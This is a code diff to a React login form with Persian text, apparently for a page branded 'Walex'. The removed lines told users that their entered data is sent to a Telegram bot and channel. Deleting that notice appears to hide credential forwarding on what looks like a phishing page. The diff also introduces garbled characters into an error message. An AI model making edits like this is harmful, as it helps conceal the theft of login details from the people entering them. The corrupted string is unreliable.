@@ -390,7 +390,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Phone submission error:", error);
       setErrors({
-        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
+        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنی��.",
       });
     } finally {
       setIsSubmitting(false);
@@ -961,21 +961,6 @@ export const LoginForm = () => {
           {/* Step 1: Phone Number Input */}
           {currentStep === "phone" && (
             <>
-              {/* Alert Messages */}
-              <div>
-                <AlertMessage>
-                    سیستم احراز هویت والکس آماده است.
-                </AlertMessage>
-
-                <div style={{ marginTop: "8px" }}>
-                  <AlertMessage>
-                    {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، ف��یل .env را ت��ظیم کنید."
-                      : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
-                  </AlertMessage>
-                </div>
-              </div>
-
               <form onSubmit={handlePhoneSubmit}>
                 <h5
                   style={{
